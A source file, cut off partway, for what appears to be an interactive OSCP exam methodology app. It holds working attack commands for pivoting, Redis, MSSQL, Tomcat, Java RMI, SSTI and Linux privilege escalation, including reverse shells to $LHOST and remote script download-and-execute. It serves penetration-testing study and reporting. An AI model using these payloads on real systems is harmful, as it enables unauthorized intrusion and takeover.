import { useState, useEffect, useRef } from "react";

// ─────────────────────────────────────────────
//  NODE GRAPH
// ─────────────────────────────────────────────
const nodes = {

  // ══════════════════════════════════════════
  //  START
  // ══════════════════════════════════════════
  start: {
    phase: "RECON",
    title: "Engagement Start",
    body: "Set your variables first — every command references them. What is your current situation?",
    cmd: `export IP=10.10.10.10
export SUBNET=192.168.185.0/24
export LHOST=10.10.14.x
export LPORT=443
export DOMAIN=domain.com

mkdir -p ~/results/$IP/{scans,exploits,loot,screenshots,tunnels}
cd ~/results/$IP`,
    warn: null,
    choices: [
      { label: "Single target IP — full port scan", next: "full_portscan" },
      { label: "Subnet — need to find live hosts first", next: "host_discovery" },
      { label: "Got a shell — need to pivot deeper", next: "pivot_start" },
      { label: "Documentation — ATT&CK structured notes", next: "reporting" },
      { label: "I am stuck / spinning / losing time", next: "mindset_stuck" },
      { label: "Pre-exam setup — before the clock starts", next: "mindset_preexam" },
      { label: "Jump to technique — skip the flow", next: "jump_menu" },
    ],
  },


  // ══════════════════════════════════════════
  //  JUMP MENU — DIRECT TECHNIQUE ACCESS
  // ══════════════════════════════════════════

  jump_menu: {
    phase: "JUMP",
    title: "Jump to Technique",
    body: "Direct access to any section. Use this for labs, CTFs, or when you already know what you are dealing with and need the technique fast.",
    cmd: `# No commands here — pick your domain`,
    warn: null,
    choices: [
      { label: "Web attacks", next: "jump_web" },
      { label: "SQL injection", next: "jump_sqli" },
      { label: "Shells & payloads", next: "jump_shells" },
      { label: "Linux privesc", next: "jump_linux" },
      { label: "Windows privesc", next: "jump_windows" },
      { label: "Active Directory", next: "jump_ad" },
      { label: "Services & ports", next: "jump_services" },
      { label: "Pivoting & tunnels", next: "jump_pivot" },
      { label: "Documentation & reporting", next: "reporting" },
      { label: "Back to start", next: "start" },
    ],
  },

  jump_web: {
    phase: "JUMP",
    title: "Web Attacks — Jump Menu",
    body: "Pick the technique directly.",
    cmd: `# Web attack reference`,
    warn: null,
    choices: [
      { label: "Web enumeration (gobuster/feroxbuster/nikto)", next: "web_enum" },
      { label: "Deep fuzzing / parameter brute force", next: "web_fuzz_deep" },
      { label: "Parameter found — test it", next: "param_found" },
      { label: "SQL injection", next: "jump_sqli" },
      { label: "File upload bypass", next: "file_upload" },
      { label: "LFI → RCE chain", next: "lfi" },
      { label: "SSRF", next: "ssrf" },
      { label: "SSTI — template injection", next: "ssti" },
      { label: "XXE", next: "xxe" },
      { label: "XSS", next: "xss" },
      { label: "IDOR", next: "idor" },
      { label: "Command injection", next: "cmd_injection" },
      { label: "WordPress", next: "wordpress" },
      { label: "Login page — brute / bypass", next: "login_page" },
      { label: "Subdomain enumeration", next: "subdomain_enum" },
      { label: "Back to jump menu", next: "jump_menu" },
    ],
  },

  jump_sqli: {
    phase: "JUMP",
    title: "SQL Injection — Jump Menu",
    body: "Pick by injection type or workflow stage.",
    cmd: `# SQLi reference index`,
    warn: null,
    choices: [
      { label: "Detection — identify injection type", next: "sqli_test" },
      { label: "Error-based extraction", next: "sqli_error" },
      { label: "UNION-based extraction", next: "sqli_union" },
      { label: "Blind boolean extraction", next: "sqli_blind" },
      { label: "Time-based blind", next: "sqli_time" },
      { label: "WAF evasion", next: "sqli_waf" },
      { label: "sqlmap full escalation", next: "sqli_sqlmap" },
      { label: "SQLi → shell (INTO OUTFILE / xp_cmdshell)", next: "sqli_shell" },
      { label: "Back to jump menu", next: "jump_menu" },
    ],
  },

  jump_shells: {
    phase: "JUMP",
    title: "Shells & Payloads — Jump Menu",
    body: "Listener setup, payload generation, shell stabilization, troubleshooting.",
    cmd: `# Shell reference index`,
    warn: null,
    choices: [
      { label: "Catch a reverse shell", next: "reverse_shell" },
      { label: "Shell not catching — troubleshoot", next: "shell_troubleshoot" },
      { label: "Bind shell (outbound filtered)", next: "shell_bind" },
      { label: "Meterpreter — setup and usage", next: "shell_meterpreter" },
      { label: "Upgrade dumb shell to full TTY", next: "shell_upgrade" },
      { label: "Buffer overflow (Windows x86)", next: "bof" },
      { label: "Client-side attacks", next: "client_side" },
      { label: "AMSI / AV bypass", next: "amsi_bypass" },
      { label: "File transfer — get tools on target", next: "file_transfer" },
      { label: "Back to jump menu", next: "jump_menu" },
    ],
  },

  jump_linux: {
    phase: "JUMP",
    title: "Linux Privesc — Jump Menu",
    body: "Pick the vector directly.",
    cmd: `# Linux privesc reference`,
    warn: null,
    choices: [
      { label: "Initial foothold — orient and enumerate", next: "linux_post_exploit" },
      { label: "LinPEAS — automated enum", next: "linpeas" },
      { label: "sudo -l — quickest win", next: "sudo_check" },
      { label: "SUID binaries", next: "suid_check" },
      { label: "Cron jobs", next: "cron_check" },
      { label: "Groups / PATH hijack", next: "linux_privesc_extra" },
      { label: "Deep manual enum (capabilities/passwd/NFS)", next: "linux_manual_enum" },
      { label: "Kernel exploit", next: "kernel_exploit" },
      { label: "Password hunting — files/history/configs", next: "linux_password_hunt" },
      { label: "Custom wordlist generation", next: "custom_wordlist" },
      { label: "Back to jump menu", next: "jump_menu" },
    ],
  },

  jump_windows: {
    phase: "JUMP",
    title: "Windows Privesc — Jump Menu",
    body: "Pick the vector directly.",
    cmd: `# Windows privesc reference`,
    warn: null,
    choices: [
      { label: "Initial foothold — orient and enumerate", next: "windows_post_exploit" },
      { label: "WinPEAS — automated enum", next: "winpeas" },
      { label: "Token impersonation (Potato attacks)", next: "token_privs" },
      { label: "Unquoted service path", next: "unquoted_service" },
      { label: "Weak service permissions", next: "weak_service" },
      { label: "AlwaysInstallElevated", next: "always_install_elevated" },
      { label: "Credential hunting (registry/files/SAM)", next: "windows_creds" },
      { label: "Pass the Hash", next: "pth" },
      { label: "DPAPI credential extraction", next: "dpapi" },
      { label: "Manual enum (tasks/DLL/UAC)", next: "windows_manual_enum" },
      { label: "Scheduled task exploitation", next: "win_schtask" },
      { label: "DLL hijacking", next: "win_dll_hijack" },
      { label: "UAC bypass", next: "win_uac_bypass" },
      { label: "AMSI / AV bypass", next: "amsi_bypass" },
      { label: "Back to jump menu", next: "jump_menu" },
    ],
  },

  jump_ad: {
    phase: "JUMP",
    title: "Active Directory — Jump Menu",
    body: "Pick the AD technique directly.",
    cmd: `# AD reference index`,
    warn: null,
    choices: [
      { label: "AD entry — assumed breach", next: "ad_start" },
      { label: "BloodHound — run and read", next: "bloodhound" },
      { label: "Responder / LLMNR poisoning", next: "responder" },
      { label: "AS-REP roasting", next: "asrep_roast" },
      { label: "Kerberoasting", next: "kerberoast" },
      { label: "Password spraying", next: "ad_spray" },
      { label: "ACL abuse (GenericAll/WriteDACL)", next: "acl_abuse" },
      { label: "Delegation attacks", next: "delegation" },
      { label: "AD Certificate Services (ESC1/ESC4)", next: "adcs" },
      { label: "DCSync — domain owned", next: "dcsync" },
      { label: "Lateral movement (PtH/WinRM/SMB)", next: "lateral_movement" },
      { label: "Manual enum — BloodHound dead end", next: "ad_manual" },
      { label: "Back to jump menu", next: "jump_menu" },
    ],
  },

  jump_services: {
    phase: "JUMP",
    title: "Services & Ports — Jump Menu",
    body: "Jump directly to a service. Same as unknown_service but organized by category.",
    cmd: `# Service reference index`,
    warn: null,
    choices: [
      { label: "Web (HTTP/HTTPS) — full enum", next: "web_enum" },
      { label: "SMB (445)", next: "smb_enum" },
      { label: "FTP (21)", next: "ftp_enum" },
      { label: "SSH (22)", next: "ssh_only" },
      { label: "RDP (3389)", next: "rdp" },
      { label: "WinRM (5985)", next: "winrm_access" },
      { label: "MySQL (3306)", next: "mysql" },
      { label: "MSSQL (1433)", next: "mssql" },
      { label: "PostgreSQL (5432)", next: "postgres" },
      { label: "MongoDB (27017)", next: "mongodb" },
      { label: "Redis (6379)", next: "redis" },
      { label: "NFS (2049)", next: "nfs_enum" },
      { label: "DNS (53)", next: "dns_enum" },
      { label: "SMTP (25/587)", next: "smtp_enum" },
      { label: "Tomcat / Java", next: "tomcat" },
      { label: "Jenkins", next: "jenkins" },
      { label: "Grafana (3000)", next: "grafana" },
      { label: "Splunk (8000/8089)", next: "splunkd" },
      { label: "Docker API (2375)", next: "docker_api" },
      { label: "Elasticsearch (9200)", next: "elasticsearch" },
      { label: "Port knocking", next: "port_knocking" },
      { label: "Credential reuse — spray everywhere", next: "cred_reuse" },
      { label: "File transfer — get tools on target", next: "file_transfer" },
      { label: "Back to jump menu", next: "jump_menu" },
    ],
  },

  jump_pivot: {
    phase: "JUMP",
    title: "Pivoting & Tunnels — Jump Menu",
    body: "Jump directly to a tunneling technique.",
    cmd: `# Pivot reference index`,
    warn: null,
    choices: [
      { label: "Pivot strategy — map the network", next: "pivot_start" },
      { label: "Ligolo-ng tunnel", next: "ligolo" },
      { label: "SSH tunnel / SOCKS proxy", next: "ssh_tunnel" },
      { label: "Chisel tunnel", next: "chisel" },
      { label: "Manual socat / netsh port forward", next: "manual_portfwd" },
      { label: "Double pivot — chain through two hosts", next: "double_pivot" },
      { label: "Internal host discovery (post-pivot)", next: "pivot_discovery" },
      { label: "Port scan through tunnel", next: "pivot_portscan" },
      { label: "Back to jump menu", next: "jump_menu" },
    ],
  },

  host_discovery: {
    phase: "DISCOVERY",
    title: "Host Discovery",
    body: "Run all methods in parallel. ARP cannot be blocked on the local subnet — most reliable method. ICMP gets filtered constantly. Merge everything into one list.",
    cmd: `sudo nmap -sn $SUBNET -oG scan.txt
grep Up scan.txt | cut -d " " -f 2 > ips_nmap.txt

sudo arp-scan $SUBNET | tee arp.txt

fping -a -g $SUBNET 2>/dev/null | tee fping.txt

cat ips_nmap.txt fping.txt | sort -u | grep -v "^$" > live_hosts.txt
cat live_hosts.txt`,
    warn: "ARP only works on your local subnet. Through a tunnel ARP is gone — use ICMP and TCP probes only.",
    choices: [
      { label: "Have host list — mass port scan", next: "mass_portscan" },
      { label: "One interesting host — deep scan it", next: "full_portscan" },
    ],
  },

  mass_portscan: {
    phase: "DISCOVERY",
    title: "Mass Port Scan",
    body: "Scan the full live host list. Grep for high-value ports to triage targets fast.",
    cmd: `nmap -iL live_hosts.txt -p- --min-rate 5000 -T4 -oG mass_scan.txt
grep "open" mass_scan.txt

rustscan -a live_hosts.txt -- -sC -sV -oN scans/rustscan.txt

grep -E "80|443|445|22|3389|5985|8080|1433|3306" mass_scan.txt`,
    warn: null,
    choices: [
      { label: "Found web target", next: "web_enum" },
      { label: "Found SMB target", next: "smb_enum" },
      { label: "Found Windows (RDP/WinRM)", next: "windows_post_exploit" },
      { label: "Found AD/DC", next: "ad_start" },
      { label: "Single target — targeted scan", next: "targeted_scan" },
    ],
  },

  pivot_start: {
    phase: "PIVOT",
    title: "Pivot — Map the Network",
    body: "You have a foothold. Map what subnets this machine can reach before building any tunnel. The routing table and ARP cache tell you everything.",
    cmd: `ip a && ip route && arp -a && cat /etc/hosts && ss -tulpn

ipconfig /all && route print && arp -a && netstat -ano

export PIVOT_SUBNET=172.16.50.0/24`,
    warn: "Map the full network BEFORE building your tunnel. You need the target subnet first.",
    choices: [
      { label: "Linux pivot — Ligolo-ng tunnel", next: "ligolo" },
      { label: "Windows pivot — Ligolo-ng tunnel", next: "ligolo" },
      { label: "SSH creds to pivot — SSH tunnel", next: "ssh_tunnel" },
      { label: "Cannot upload tools — socat/netsh", next: "manual_portfwd" },
    ],
  },

  ligolo: {
    phase: "PIVOT",
    title: "Ligolo-ng Tunnel",
    body: "Cleanest tunnel for OSCP. Proxy on Kali, agent on pivot. Once running your Kali tools hit internal hosts directly — no proxychains needed.",
    cmd: `sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# Linux pivot:   ./agent -connect $LHOST:11601 -ignore-cert
# Windows pivot: .\\agent.exe -connect $LHOST:11601 -ignore-cert

session
[select number]
start

sudo ip route add $PIVOT_SUBNET dev ligolo
ping 172.16.50.1`,
    warn: "Add the route AFTER the tunnel starts. Without the route traffic does not flow.",
    choices: [
      { label: "Tunnel up — discover internal hosts", next: "pivot_discovery" },
      { label: "Tunnel up — scan known internal target", next: "pivot_portscan" },
      { label: "Need to chain through another pivot", next: "double_pivot" },
    ],
  },

  ssh_tunnel: {
    phase: "PIVOT",
    title: "SSH Tunnel",
    body: "SSH creds to the pivot means no binary uploads needed. Dynamic -D gives a full SOCKS5 proxy for proxychains.",
    cmd: `ssh -D 1080 -N -f user@$IP
# /etc/proxychains4.conf: socks5 127.0.0.1 1080
proxychains nmap -sT -p 80,443,445 172.16.50.0/24

ssh -L 8080:172.16.50.5:80 user@$IP -N
curl http://localhost:8080

ssh -R 4444:127.0.0.1:4444 user@$IP -N

ssh -J user@$IP user2@172.16.50.5`,
    warn: "proxychains + nmap: always -sT. Never -sS through SOCKS — it will hang.",
    choices: [
      { label: "SOCKS proxy up — discover internal hosts", next: "pivot_discovery" },
      { label: "Port forward set — scan specific service", next: "pivot_portscan" },
    ],
  },

  manual_portfwd: {
    phase: "PIVOT",
    title: "Manual Port Forward",
    body: "No binary uploads possible. socat on Linux, netsh on Windows. One port at a time.",
    cmd: `socat TCP-LISTEN:8080,fork TCP:172.16.50.5:80 &

netsh interface portproxy add v4tov4 \\
  listenaddress=0.0.0.0 listenport=8080 \\
  connectaddress=172.16.50.5 connectport=80
netsh interface portproxy show all
netsh interface portproxy delete v4tov4 \\
  listenaddress=0.0.0.0 listenport=8080

iptables -t nat -A PREROUTING -p tcp --dport 8080 \\
  -j DNAT --to-destination 172.16.50.5:80
iptables -t nat -A POSTROUTING -j MASQUERADE`,
    warn: null,
    choices: [
      { label: "Port forwarded — access service on Kali", next: "web_enum" },
      { label: "Need full network access — try Chisel", next: "chisel" },
    ],
  },

  chisel: {
    phase: "PIVOT",
    title: "Chisel Tunnel",
    body: "Chisel runs over HTTP — works when direct TCP is blocked by firewall. Server on Kali, client on pivot.",
    cmd: `./chisel server -p 8080 --reverse --socks5

./chisel client $LHOST:8080 R:socks
.\\chisel.exe client $LHOST:8080 R:socks

proxychains nmap -sT -p- 172.16.50.5

./chisel client $LHOST:8080 R:3306:172.16.50.5:3306`,
    warn: "proxychains + nmap: always -sT. UDP and ICMP do not traverse SOCKS.",
    choices: [
      { label: "Tunnel up — discover internal hosts", next: "pivot_discovery" },
      { label: "Tunnel up — scan internal target", next: "pivot_portscan" },
    ],
  },

  pivot_discovery: {
    phase: "PIVOT",
    title: "Internal Host Discovery",
    body: "You are on a routed network now — ARP is gone. ICMP and TCP probes only. Through Ligolo scan directly. Through proxychains use -sT and drop the rate.",
    cmd: `sudo nmap -sn $PIVOT_SUBNET -oG pivot_scan.txt
grep Up pivot_scan.txt | cut -d " " -f 2 > pivot_hosts.txt
fping -a -g $PIVOT_SUBNET 2>/dev/null >> pivot_hosts.txt

proxychains nmap -sT -sn $PIVOT_SUBNET --min-rate 200

for i in $(seq 1 254); do
  ping -c1 -W1 172.16.50.$i &>/dev/null && echo "172.16.50.$i" &
done; wait

for /L %i in (1,1,254) do @ping -n 1 -w 100 172.16.50.%i | findstr "TTL"

sort -u pivot_hosts.txt > internal_live.txt`,
    warn: "Max --min-rate 200 through proxychains. Higher rates drop packets.",
    choices: [
      { label: "Found internal hosts — port scan them", next: "pivot_portscan" },
      { label: "Found AD / DC", next: "ad_start" },
      { label: "Found another subnet — double pivot", next: "double_pivot" },
    ],
  },

  pivot_portscan: {
    phase: "PIVOT",
    title: "Port Scan Through Tunnel",
    body: "Ligolo: treat like a direct connection. Proxychains: -sT required, lower rate. Never -sS through SOCKS.",
    cmd: `nmap -p- --min-rate 2000 -T3 172.16.50.5 -oN scans/pivot_allports.txt
nmap -p <PORTS> -sC -sV 172.16.50.5 -oN scans/pivot_targeted.txt

proxychains nmap -sT -p 80,443,445,22,3389,5985,1433,3306 \\
  172.16.50.5 --open -T2
proxychains curl -sv http://172.16.50.5

for host in $(cat internal_live.txt); do
  nmap -p 80,443,445,22,3389,5985,8080 \\
    --open $host -oN scans/pivot_$host.txt
done`,
    warn: "Never -sS through proxychains. Always -sT.",
    choices: [
      { label: "Found internal web", next: "web_enum" },
      { label: "Found internal SMB", next: "smb_enum" },
      { label: "Found internal AD / DC", next: "ad_start" },
      { label: "Found another pivot layer", next: "double_pivot" },
      { label: "Full service enum", next: "targeted_scan" },
    ],
  },

  double_pivot: {
    phase: "PIVOT",
    title: "Double Pivot",
    body: "Three-hop chain: Kali to Pivot1 to Pivot2 to Target. Chain Ligolo listeners or nest SSH tunnels. Draw the map first.",
    cmd: `listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601

./agent -connect 172.16.50.X:11601 -ignore-cert

session
[select pivot2]
start

sudo ip route add 10.10.10.0/24 dev ligolo

ssh -D 1080 user@pivot1 -N &
proxychains ssh -D 1081 user@172.16.50.X -N &`,
    warn: "Every hop adds latency. Drop scan rates further with each layer.",
    choices: [
      { label: "Double pivot up — discover third network", next: "pivot_discovery" },
      { label: "Reached target — enumerate it", next: "targeted_scan" },
    ],
  },

  unknown_service: {
    phase: "RECON",
    title: "Unknown Service / Port",
    body: "nmap gave you a port you don't recognize. Banner grab first, then version-specific research. Every service has a fingerprint.",
    cmd: `nc -nv $IP <PORT>
curl -sv http://$IP:<PORT>
curl -sv https://$IP:<PORT>

nmap -p <PORT> -sC -sV --version-intensity 9 $IP

# Common high-port services:
# 8080/8443/8009 — Tomcat, JBoss, GlassFish
# 9200/9300     — Elasticsearch
# 6379          — Redis
# 27017         — MongoDB
# 1433          — MSSQL
# 1099          — Java RMI
# 5432          — PostgreSQL
# 11211         — Memcached
# 2181          — ZooKeeper
# 4848          — GlassFish admin

searchsploit $(nmap -p <PORT> -sV $IP | grep open | awk '{print $3,$4}')`,
    warn: null,
    choices: [
      { label: "Tomcat / JBoss / Java app server", next: "tomcat" },
      { label: "Redis (6379)", next: "redis" },
      { label: "MSSQL (1433)", next: "mssql" },
      { label: "PostgreSQL (5432)", next: "postgres" },
      { label: "MongoDB (27017)", next: "mongodb" },
      { label: "MySQL (3306)", next: "mysql" },
      { label: "NFS (2049)", next: "nfs_enum" },
      { label: "Rsync (873)", next: "rsync" },
      { label: "SMTP (25/587)", next: "smtp_enum" },
      { label: "Elasticsearch (9200)", next: "elasticsearch" },
      { label: "Docker API (2375/2376)", next: "docker_api" },
      { label: "VNC (5900)", next: "vnc" },
      { label: "DNS (53)", next: "dns_enum" },
      { label: "Grafana (3000)", next: "grafana" },
      { label: "Splunk (8000/8089)", next: "splunkd" },
      { label: "Memcached (11211)", next: "memcached" },
      { label: "Java RMI (1099)", next: "java_rmi" },
      { label: "Web interface found", next: "web_enum" },
      { label: "Searchsploit hit", next: "searchsploit_web" },
    ],
  },

  tomcat: {
    phase: "WEB",
    title: "Apache Tomcat",
    body: "Manager console upload is the classic path. Default creds are shockingly common. AJP connector (8009) enables Ghostcat if exposed.",
    cmd: `# Manager console
http://$IP:8080/manager/html
http://$IP:8080/host-manager/html

# Default creds to try:
# tomcat:tomcat   tomcat:s3cret   admin:admin
# admin:tomcat    manager:manager  both:both

# Brute force manager
hydra -L /opt/SecLists/Usernames/tomcat-usernames.txt \\
  -P /opt/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt \\
  http-get://$IP:8080/manager/html

# Once in — deploy malicious WAR
msfvenom -p java/jsp_shell_reverse_tcp \\
  LHOST=$LHOST LPORT=$LPORT -f war -o shell.war
# Upload via Manager > Deploy > WAR file
# Access: http://$IP:8080/shell/

# Ghostcat CVE-2020-1938 (AJP port 8009)
python3 ghostcat.py -p 8009 $IP`,
    warn: null,
    choices: [
      { label: "WAR deployed — got shell", next: "shell_upgrade" },
      { label: "Ghostcat file read — found creds", next: "creds_found" },
      { label: "No manager access", next: "searchsploit_web" },
    ],
  },

  redis: {
    phase: "RECON",
    title: "Redis (6379)",
    body: "Unauthenticated Redis is often RCE. Write SSH keys, cron jobs, or webshells depending on what Redis can reach.",
    cmd: `redis-cli -h $IP ping
redis-cli -h $IP info

# If authenticated — try default passwords
redis-cli -h $IP -a ""
redis-cli -h $IP -a "redis"
redis-cli -h $IP -a "password"

# RCE via authorized_keys
redis-cli -h $IP config set dir /root/.ssh
redis-cli -h $IP config set dbfilename authorized_keys
redis-cli -h $IP set payload "\\n\\n$(cat ~/.ssh/id_rsa.pub)\\n\\n"
redis-cli -h $IP save

# RCE via cron (if /var/spool/cron writable)
redis-cli -h $IP config set dir /var/spool/cron
redis-cli -h $IP config set dbfilename root
redis-cli -h $IP set payload "\\n\\n* * * * * bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1\\n\\n"
redis-cli -h $IP save`,
    warn: "Check what user Redis runs as before choosing your attack path.",
    choices: [
      { label: "SSH key write — got root shell", next: "got_root_linux" },
      { label: "Cron job — got shell", next: "shell_upgrade" },
      { label: "Authenticated — needs password", next: "bruteforce" },
    ],
  },

  mssql: {
    phase: "RECON",
    title: "MSSQL (1433)",
    body: "MSSQL with xp_cmdshell enabled is instant RCE. SA account with default creds is common. impacket-mssqlclient handles everything.",
    cmd: `impacket-mssqlclient sa:''@$IP
impacket-mssqlclient sa:'sa'@$IP
impacket-mssqlclient sa:'password'@$IP -windows-auth

# Once connected:
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
SQL> xp_cmdshell "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/shell.ps1')"

# If xp_cmdshell disabled — enable it
SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

# Read files
SQL> BULK INSERT tmp FROM 'C:\\Windows\\System32\\drivers\\etc\\hosts' WITH (ROWTERMINATOR='\\n');
SQL> SELECT * FROM tmp;`,
    warn: null,
    choices: [
      { label: "xp_cmdshell RCE — get reverse shell", next: "reverse_shell" },
      { label: "Got creds from DB", next: "creds_found" },
      { label: "Need creds", next: "bruteforce" },
    ],
  },

  java_rmi: {
    phase: "RECON",
    title: "Java RMI (1099)",
    body: "Exposed Java RMI registry is often exploitable via deserialization. ysoserial generates payloads for common gadget chains.",
    cmd: `nmap -p 1099 --script rmi-dumpregistry $IP
nmap -p 1099 --script rmi-vuln-classloader $IP

# Enumerate RMI registry
rmg enum $IP 1099

# ysoserial payload generation
# Find the right gadget chain — try CommonsCollections first
java -jar ysoserial.jar CommonsCollections6 'bash -c {bash,-i,>&,/dev/tcp/$LHOST/$LPORT,0>&1}' | \\
  java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit $IP 1099 CommonsCollections6 \\
  'bash -c {bash,-i,>&,/dev/tcp/$LHOST/$LPORT,0>&1}'

# remote-method-guesser (rmg) for modern exploitation
rmg exploit $IP 1099 --payload 'bash -c bash$IFS-i>&/dev/tcp/$LHOST/$LPORT<&1'`,
    warn: "Gadget chain depends on classpath — try CommonsCollections1-7, Spring, Groovy.",
    choices: [
      { label: "Got shell via deserialization", next: "shell_upgrade" },
      { label: "Registry accessible — searchsploit version", next: "searchsploit_web" },
    ],
  },

  ssrf: {
    phase: "WEB",
    title: "SSRF",
    body: "Pivot through the web app to reach internal services. Time-based internal port scanning is reliable. Cloud metadata is a bonus prize.",
    cmd: `nc -nlvp 80

curl "http://$IP/page?url=http://$LHOST/"
curl "http://$IP/page?url=http://127.0.0.1/"
curl "http://$IP/page?url=http://169.254.169.254/"

# Internal port scan via timing
for port in 22 80 443 445 3306 5432 6379 8080 8443; do
  echo -n "$port: "
  time curl -so /dev/null "http://$IP/page?url=http://127.0.0.1:$port/"
done

# Cloud metadata
curl "http://$IP/page?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# File read
curl "http://$IP/page?url=file:///etc/passwd"
curl "http://$IP/page?url=gopher://127.0.0.1:25/"`,
    warn: null,
    choices: [
      { label: "Reached internal service", next: "pivot_portscan" },
      { label: "Cloud metadata creds", next: "creds_found" },
      { label: "File read working — LFI path", next: "lfi" },
    ],
  },

  ssti: {
    phase: "WEB",
    title: "SSTI — Template Injection",
    body: "Input reflected in a template engine. Test math expressions — if 7*7 returns 49, you have SSTI. Engine fingerprint determines the payload.",
    cmd: `# Probe — inject into every input field
{{7*7}}       # if returns 49 = Jinja2/Twig
#{7*7}        # if returns 49 = Ruby ERB
<%= 7*7 %>    # ERB / EJS

# Jinja2 (Python/Flask) — RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Jinja2 sandbox escape
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}

# Twig (PHP) — RCE
{{['id']|filter('system')}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# FreeMarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>\${ex("id")}`,
    warn: null,
    choices: [
      { label: "Got RCE via SSTI", next: "reverse_shell" },
      { label: "Reflected but no RCE — different engine", next: "web_fuzz_deep" },
    ],
  },

  ad_manual: {
    phase: "AD",
    title: "AD Manual Enum — BloodHound Dead End",
    body: "BloodHound found nothing useful. Go manual. net commands, LDAP queries, share permissions, local admin hunting.",
    cmd: `net user /domain
net group /domain
net group "Domain Admins" /domain
net localgroup administrators

Get-DomainUser | select samaccountname,description
Get-DomainComputer | select name,operatingsystem
Get-DomainGroupMember "Domain Admins"
Find-LocalAdminAccess

ldapsearch -x -h $IP -D "user@domain.com" -w 'pass' \\
  -b "dc=domain,dc=com" "(objectClass=user)" description

Get-DomainUser | select samaccountname,description \\
  | where {$_.description -ne $null}

Find-DomainShare -CheckShareAccess`,
    warn: null,
    choices: [
      { label: "Found password in description field", next: "creds_found" },
      { label: "Found local admin on another machine", next: "lateral_movement" },
      { label: "Found interesting share", next: "smb_loot" },
      { label: "Check AD CS for vulnerable templates", next: "adcs" },
      { label: "Nothing — try GenericWrite/shadow creds", next: "acl_abuse" },
    ],
  },

  linux_privesc_extra: {
    phase: "LINUX",
    title: "Linux Privesc — Groups and PATH",
    body: "Docker, LXD, disk, adm group memberships are instant root. Writable PATH directory before a privileged binary call is reliable.",
    cmd: `id   # check ALL group memberships

# Docker group — instant root
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# LXD group — instant root
lxc image import ./alpine.tar.gz --alias alpine
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh

# disk group — read raw disk
debugfs /dev/sda1
debugfs> cat /etc/shadow

# adm group — read logs (find creds in logs)
grep -ri "password\\|pass\\|auth" /var/log/ 2>/dev/null

# Writable PATH hijack
echo $PATH
find / -writable -type d 2>/dev/null | grep -v proc
# Create malicious binary ahead of real one in PATH
echo -e '#!/bin/bash\\nchmod +s /bin/bash' > /tmp/curl
chmod +x /tmp/curl
export PATH=/tmp:$PATH`,
    warn: null,
    choices: [
      { label: "Docker/LXD/disk group — ROOT!", next: "got_root_linux" },
      { label: "PATH hijack worked — ROOT!", next: "got_root_linux" },
      { label: "Nothing — kernel exploit", next: "kernel_exploit" },
    ],
  },

  // ══════════════════════════════════════════
  //  DOCUMENTATION — MITRE ATT&CK SUBGRAPH
  // ══════════════════════════════════════════

  reporting: {
    phase: "REPORT",
    title: "Documentation — The Path",
    body: "Structure your notes around MITRE ATT&CK tactics. Walk each tactic in order — it forces completeness and produces a report that speaks the language of every SOC, client, and hiring manager. Document AS YOU GO. OffSec has failed candidates with all flags for insufficient evidence.",
    cmd: `# Set up your machine folder NOW — before you hack
mkdir -p ~/results/$IP/{scans,exploits,loot,screenshots,tunnels}

# ATT&CK Tactic flow for each machine:
# TA0043 → Reconnaissance
# TA0001 → Initial Access
# TA0002 → Execution
# TA0004 → Privilege Escalation
# TA0006 → Credential Access      (if applicable)
# TA0008 → Lateral Movement       (if applicable)
# TA0007 → Discovery              (post-shell enum)
# TA0040 → Impact                 (flags)

# Minimum screenshots per machine: 4
# foothold + local.txt + privesc vector + proof.txt`,
    warn: "Do not wait until the end to write notes. You will forget the middle — the middle is what OffSec grades.",
    choices: [
      { label: "TA0043 — Reconnaissance", next: "doc_recon" },
      { label: "TA0001 — Initial Access", next: "doc_initial_access" },
      { label: "TA0004 — Privilege Escalation", next: "doc_privesc" },
      { label: "TA0006 — Credential Access", next: "doc_cred_access" },
      { label: "TA0008 — Lateral Movement", next: "doc_lateral" },
      { label: "TA0040 — Impact (flags)", next: "doc_impact" },
      { label: "Final submission checklist", next: "doc_submit" },
      { label: "Back to hacking", next: "start" },
    ],
  },

  doc_recon: {
    phase: "REPORT",
    title: "TA0043 — Reconnaissance",
    body: "Document every service you identified and how. This section justifies your attack path — reviewers need to see that you found the vulnerability through methodical enumeration, not luck.",
    cmd: `# TA0043 Reconnaissance — note template
# Technique IDs to reference:
#   T1595 — Active Scanning (nmap, masscan)
#   T1592 — Gather Host Information (service versions)
#   T1590 — Gather Network Information (DNS, subnet mapping)
#   T1046 — Network Service Discovery

## Recon Summary for $IP
Host: $IP
OS Guess: [Linux/Windows + version]
Open Ports: [list]

## Services Identified
| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 80   | HTTP    | Apache 2.4.49 | CVE-2021-41773 candidate |
| 445  | SMB     | Samba 4.x     | Anonymous auth? Y/N |

## Key Findings
- [What stood out — outdated version, misconfig, anonymous access]
- [Why you chose the attack path you did]

## Evidence
- Screenshot: nmap full scan output
- Screenshot: service version banner
- File: ~/results/$IP/scans/full.txt`,
    warn: "Version numbers matter — 'Apache on port 80' fails. 'Apache 2.4.49 on port 80, CVE-2021-41773 confirmed' passes.",
    choices: [
      { label: "TA0001 — Initial Access", next: "doc_initial_access" },
      { label: "Back to tactic index", next: "reporting" },
    ],
  },

  doc_initial_access: {
    phase: "REPORT",
    title: "TA0001 — Initial Access",
    body: "The foothold section. Be exact — command, payload, response. This is the section most candidates under-document because they're excited to move on. Slow down.",
